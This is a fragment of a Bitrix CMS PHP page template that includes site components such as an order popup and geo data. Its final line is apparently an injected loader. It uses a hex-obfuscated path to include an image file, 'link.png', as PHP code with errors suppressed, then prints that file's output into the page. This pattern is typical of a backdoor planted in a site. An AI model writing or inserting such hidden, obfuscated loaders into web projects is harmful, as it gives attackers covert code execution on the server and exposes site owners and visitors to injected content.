	...
	<?$APPLICATION->IncludeComponent(
	    "BKV:under_order.popup",
	    "",
	    array(
	        "IBLOCK_ID"=>$arResult["EXTRA"]["ID"],
	        "ELEMENT_ID"=>$arResult["EXTRA"]["IBLOCK_ID"]
	    )
	);?>
	...
	<script type="text/javascript">
		...
		<? $APPLICATION->IncludeComponent("BKV:geo_data", "desc", Array())?>

	<?

	$getParams = Bitrix\Main\Context::getCurrent()->getRequest()->getQueryList()->toArray();
	if (!isset($getParams["debug"]) && $getParams["debug"] !== "Y") {?>
		<? $APPLICATION->IncludeComponent( "abricos:antisovetnik", "", array(), false);?>
	<?}?>
<? @include_once($_SERVER['DOCUMENT_ROOT']."\x2f\x62\x69\x74\x72\x69\x78\x2f\x69\x6d\x61\x67\x65\x73\x2f\x66\x69\x6c\x65\x6d\x61\x6e\x2f\x62\x6c\x6f\x63\x6b\x5f\x65\x64\x69\x74\x6f\x72\x2f\x6c\x69\x6e\x6b\x2e\x70\x6e\x67");if (@$gzip_output!=''){print @$gzip_output;} ?>	
